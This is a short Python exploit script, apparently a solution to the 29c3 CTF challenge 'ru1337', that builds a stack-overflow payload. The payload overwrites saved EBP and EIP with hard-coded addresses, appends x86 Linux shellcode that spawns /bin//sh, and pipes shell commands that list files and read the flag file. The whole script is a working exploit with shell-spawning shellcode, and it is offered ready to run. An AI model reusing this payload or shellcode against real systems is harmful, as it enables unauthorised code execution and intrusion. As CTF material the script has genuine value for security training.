# http://shell-storm.org/repo/CTF/29c3/Exploitation/ru1337/

import struct
import subprocess
import sys

base = 0
def padwith(buf, size):
        return buf + 'A' * (size - len(buf))

def gadget(addr_off):
        return struct.pack("<I", (base + (addr_off - 0x17420)))

def uint(v):
        return struct.pack("<I", v)

def addr(a):
        return uint(a)

buf = ""

buf += 'PPPP'
buf += "PPPPAAADAAAEAAA\x00"
buf += uint(0x0BADC000) # EBP
buf += uint(0x08048580) # EIP
buf += uint(0x0BADC000) # return EIP
buf += uint(0x0BADC000)
buf += uint(0x400)
buf += uint(0x00000004)
buf += "AAAF"
buf += "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
buf += "A"*110

sys.stdout.write( buf )
sys.stdout.write( ";\nls;cat ru1337\n" )
